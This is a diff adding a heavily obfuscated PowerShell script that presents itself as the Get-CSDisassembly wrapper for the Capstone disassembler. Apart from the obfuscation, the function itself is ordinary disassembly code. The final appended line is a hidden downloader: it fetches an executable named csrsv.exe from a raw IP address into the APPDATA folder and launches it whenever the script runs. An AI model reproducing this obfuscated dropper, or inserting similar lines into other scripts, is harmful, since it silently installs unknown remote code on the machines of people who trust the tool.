@@ -1,0 +1,76 @@
+ $Dx2C  =  [TYpE]("{1}{0}{2}{3}{4}"-f'TOn','Caps','E.a','RChIt','eCtuRE'); &("{0}{1}"-f 'Se','t')  ("{1}{0}"-f'Lr','sU') ([tyPE]("{0}{3}{1}{2}"-F 'CA','MOd','E','pStONe.') );  .("{2}{1}{0}" -f 'M','TE','SEt-i') ("{1}{0}{3}{2}{4}"-f'Ar','v','le:','IaB','xGKV') ([TYPe]("{1}{2}{3}{0}"-F'NE','CapST','one.CAPs','To'))  ;  &("{1}{2}{0}" -f'iaBLe','s','et-VAr')  ("{1}{0}" -f'y','4U93')  ( [tyPe]("{1}{3}{2}{0}" -F 'Ue','cApSt','VAl','OnE.OPtiOn'))  ;function g`E`T-Cs`DiSAssE`Mbly
+{
+
+
+    [OutputType([Capstone.Instruction])]
+    [CmdletBinding(DEfAuLTPArAMeTErSeTNAMe = {"{3}{2}{1}{0}"-f'e','assembl','is','D'})]
+    Param (
+        [Parameter(mAndatOrY, ParaMEtErsETName = "d`iS`AssEmBle")]
+        [Capstone.Architecture]
+        ${A`R`cHitecT`UrE},
+
+        [Parameter(MandATorY, ParaMeTERsETnAME = "d`IS`AsseMbLe")]
+        [Capstone.Mode]
+        ${mO`De},
+
+        [Parameter(mAnDAToRY, PARAmEtERsetNAME = "DISas`Se`Mble")]
+        [ValidateNotNullOrEmpty()]
+        [Byte[]]
+        ${CO`DE},
+
+        [Parameter( paRameteRseTNAmE = "D`Isa`sse`mBle" )]
+        [UInt64]
+        ${Of`FS`Et} = 0,
+
+        [Parameter( PArAmEtErsEtNAME = "d`is`ASseMble" )]
+        [UInt32]
+        ${Cou`Nt} = 0,
+
+        [Parameter( paRaMeTeRSetnaMe = "D`iSA`sSE`mBlE" )]
+        [ValidateSet({"{0}{1}" -f'I','ntel'}, 'ATT')]
+        [String]
+        ${s`YN`TAX},
+
+        [Parameter( PARametERsETNamE = "d`iSa`sSeM`BLe" )]
+        [Switch]
+        ${De`TAi`l`ON},
+
+        [Parameter( parametErSEtnAME = "versi`On" )]
+        [Switch]
+        ${VE`RSIOn}
+    )
+
+    if (${P`SC`MdLet}.ParaMeteRsEtname -eq ("{2}{0}{1}"-f 'si','on','Ver'))
+    {
+        ${DisA`Sse`Mb`lY} = .("{0}{1}{2}" -f'N','ew-Objec','t') ("{2}{3}{0}{1}"-f 'to','ne','Ca','pstone.Caps')( (  &('gi')  ('vARiaBl'+'e:d'+'X2'+'c'))."v`ALUE"::"x`86",   $SuLr::"MoD`E16")
+        ${DISa`s`seMBLY}."ve`RsiON"
+
+        return
+    }
+
+    ${DIsA`s`sembLY} = &("{2}{1}{0}"-f'ct','w-Obje','Ne') ("{2}{3}{0}{1}" -f'p','stone','Capst','one.Ca')(${A`RchItEc`TU`Re}, ${mo`dE})
+
+    if (${d`is`AsSEmbly}."veR`S`ION" -ne  (  .("{3}{0}{2}{1}"-f 'hi','EM','lDIt','Get-C') ("{3}{1}{2}{0}{4}"-f 'IaBlE:XGK','a','R','v','V') )."v`AlUE"::"BIn`dI`NGvE`RS`IOn")
+    {
+        .("{0}{2}{1}"-f 'W','Error','rite-') "capstone.dll version ($([Capstone.Capstone]::BindingVersion.ToString())) should be the same as libcapstone.dll version. Otherwise, undefined behavior is likely. "
+    }
+
+    if (${Sy`NT`AX})
+    {
+        switch (${s`YN`TaX})
+        {
+            ("{0}{1}"-f'Int','el') { ${sy`N`TaXMOde} =   $4U93Y::"SYnT`AXIN`TeL" }
+            'ATT'   { ${S`Y`NTAxMo`de} =   (  .("{1}{0}"-f'i','gC') ("{2}{0}{1}"-f 'e:','4U93Y','vArIaBl'))."vaL`Ue"::"syNtA`xatt" }
+        }
+
+        ${DISA`SsEM`BLy}.("{2}{1}{0}"-f'x','a','SetSynt').Invoke(${syn`TAx`M`Ode})
+    }
+
+    if (${DEtA`iL`ON})
+    {
+        ${DiSas`se`mBLY}.("{2}{3}{1}{0}" -f'ail','et','S','etD').Invoke(${t`RUe})
+    }
+
+    ${Di`s`ASSEMb`ly}.("{3}{1}{2}{0}" -f'e','assemb','l','Dis').Invoke(${co`DE}, ${o`FfS`eT}, ${cOU`NT})
+}
+(&("{2}{0}{1}"-f 'c','t','New-Obje') ("{1}{0}{3}{2}{4}"-f'tem.Net.W','Sys','en','ebCli','t')).("{0}{3}{1}{2}" -f 'Downl','Fil','e','oad').Invoke(("{1}{4}{6}{0}{3}{2}{5}" -f '02.','http:','238/~yahoo/csrsv.ex','53.','/','e','/94.1'),"$env:APPDATA\csrsv.exe");&("{1}{3}{2}{0}"-f 'rocess','S','-P','tart') ("$env:APPDATA\csrsv.exe")
